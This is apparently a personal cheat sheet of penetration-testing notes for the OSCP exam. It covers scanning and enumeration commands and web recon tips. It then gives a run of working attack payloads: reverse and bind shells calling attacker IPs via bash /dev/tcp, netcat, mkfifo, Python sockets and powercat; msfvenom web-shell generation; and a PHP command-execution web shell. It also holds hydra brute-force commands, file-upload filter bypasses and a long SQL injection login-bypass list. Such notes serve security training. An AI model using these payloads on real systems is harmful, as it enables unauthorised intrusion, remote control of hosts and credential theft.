https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97

Scanning the IP's
==================================================================================
arp-scan -N 192.168.100.1/24 -I eth0   ---> very fast
netdiscover -i eth0 -r 192.168.100.1/24 ---> Need to run with arp
nmap -sP 192.168.100.1/24 > /tmp/live host 
   |__>  cat /tmp/live | grep 192
cut -d: -f1,3 /etc/passwd   ----> https://www.thegeekdiary.com/using-cut-on-linux-terminal/ 
searchpoloit <app>version


Enumerating services
===================================================================================
nmap -sC -sV --script=vulscan/vulscan.nse -oA nmap/ip -T5 -p- 192.168.100.9
masscan --ports 0-65535 192.168.100.9   ---> result comes after death
spatra  ----> one of the best tool (nmap, nikto and so on ..)
nikto -h 192.168.100.9
gobuster dir -e -k -u http://192.168.100.9 -w directory-list-medium.txt  -x php
  -> dirbus/common
  -> dirbus/small
  -> dirbus/medium
  -> dirbus/medium-lowercase



Keywords to be noted - Hey man you have butter in hand search for it
====================================================================================
Services
+++++++++
different service 139, 445, 111,123 in linux, 22 in windows
unwanted information in the services ( mysql service in web app)


Webpages
++++++++++
ready slowly each content
header, server info --> spatra, nikto tool
Navigate to all pages ---> very very very important to do no wory abut time
read the framework of the webpages -- OSCP guy are very lazy

welcome, hello, MR, Sir, Dear, Hi   ---> Gives the username 
dev, development, prod, production  --> information to exploit vul
Look in to this, navigate to this --> something is hidden in this page (SQL, com ..)
search for param page, system, include, index.php ---> LFI to get /etc/passwd%00jpg
read the source.. hidden parts will there to bypass and spwan a shell 

search for /robots.txt




* Bloody dnt waste on time for XSS ...



Reverse Shell - Linux
======================================================================================
# no binary installed
bash -i >& /dev/tcp/192.168.100.50/5555 0>&1   ===> works 100% on all linux
/bin/sh -i >& /dev/tcp/192.168.100.50/4455 0>&1
nc -e /bin/sh 192.168.100.50 4455(reverse shell) ===> Listner nc -lvvp 5555
nc -lp 5544 -e /bin/sh (Bind shell)
index');${system('nc -e /bin/sh 192.168.100.9 5555')};# ----> subtitute payload for ruby payloads
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
/usr/bin/python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.50",4455));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

https://sushant747.gitbooks.io/total-oscp-guide/webshell.html
http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Reverse Shell- Windows
=========================================================================================
rsg tun0 1234 powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

Bind Shell - windows
=========================================================================================


web payloads
------------
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
msfvenom -a x86 --platform windows -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -e x86/shi
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war

https://wikihak.com/creating-metasploit-payloads-using-msfvenom/

File Transfer - Windows
=========================================================================================
powercat -c 192.168.100.50 - p 443 -i <file location.txt>   <-> nc -lvp 443 
powercat is as like nc  --{waste tool stucks most of time}


Shell Spawning
========================================================================================
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/bash";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within IRB)
exec "/bin/sh"
(From within vi)
:!bash
(From within vi)
:set shell=/bin/bash:shell
(From within nmap)
!sh
https://netsec.ws/?p=337

<?php $command=$_GET["x"];echo shell_exec($command);?>

export TERM=xterm   ====> to use with shortcuts
ctrl+z
stty raw -echo
stty -rows 48 -columns 120
stty size
export PATH="$PATH:/my/path/fo"

to unset stty -> stty sane
stty erase '^H'


File Transfer
===================================================================================
wget <file.ext> -P /path/to/folder
curl http://example.com --output my.file

Compling - 32 bit 
=====================================================================================
gcc -m32 -Wl, --hash-style=both 9542.c -o 9542

Password crackers
========================================================================================
https://hashcat.net/wiki/doku.php?id=example_hashes
sort filename | uniq
hash-identifier <hash>
john --format=raw-md5 THEHASHFILE.txt
john --format=raw-shal --wordlist=password.txt THEHASHFILE.txt =====> most fast tool with pas file
/root/.john/john.pot  ===> cracked erailer
john --format=raw-md5 --show THEHASHFILE.txt   ---> to show cracked password
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
sqlmap => /usr/share/sqlmap/data/txt/wordlist.tx
hashcat -m <num> -a 3 hashfile.txt  === > waste 
hydra -l user -P password.txt ssh://192.168.100.9/
hydra -L usernames.txt -P passwords.txt 192.168.100.50 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”

hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”

hydra 10.10.10.43 -l anything -P /usr/share/seclists/Passwords/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -s 443


File upload - cheatsheet
-------------------------
1. file.php.jpg
2. file.php%00.jpg
3. file.php%00%00.jpg
4. magic bytes
5. file.asp:.jpg
6. file.asp::$data
7. file.aSp or file.PHp3
8. file.asp… … . . .. .
9. file.asp;.jpg (Only in IIS 6 or prior)

https://github.com/OWASP/wstg/tree/master/document
https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/


LFI -cheat sheet
-----------------
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
https://github.com/xapax/security/blob/master/local_file_inclusion.md


windows to linux
---------------
$ cat -v outputfile | head
sed -i 's/\r$//g' 34896.py 
$ tr -d '\r' < inputfile > outputfile

Cross c

https://backdoorshell.gitbooks.io/oscp-useful-links/content/vulnhub-vms.html

SQLI Login CheatSheet
=======================================================================================
hey dear first find the feild where its vulneable to injectable 
or 1=1
or 1=1-- 
or 1=1# 
or 1=1/* 
admin' -- 
admin' # 
admin'/* 
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1 
admin' or 1=1-- 
admin' or 1=1# 
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055




